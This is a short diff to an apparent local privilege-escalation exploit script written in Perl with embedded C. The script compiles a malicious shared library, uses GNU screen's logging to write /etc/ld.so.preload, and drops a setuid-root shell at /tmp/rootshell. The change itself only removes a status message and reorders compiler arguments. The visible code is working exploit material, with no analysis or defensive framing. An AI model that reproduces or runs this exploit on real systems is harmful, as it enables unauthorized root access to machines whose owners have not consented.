@@ -18,7 +18,6 @@ void dropshell(void){
     chown("/tmp/rootshell", 0, 0);
     chmod("/tmp/rootshell", 04755);
     unlink("/etc/ld.so.preload");
-    printf("[+] done!\n");
 }
 END
 
@@ -43,7 +42,7 @@ close(FH);
 # Exploit
 
 sub exploit {
-system("gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c");
+system("gcc -fPIC -shared -ldl /tmp/libhax.c -o /tmp/libhax.so");
 system("gcc -o /tmp/rootshell /tmp/rootshell.c");
 system("cd /etc && umask 000 ");
 system('screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so');
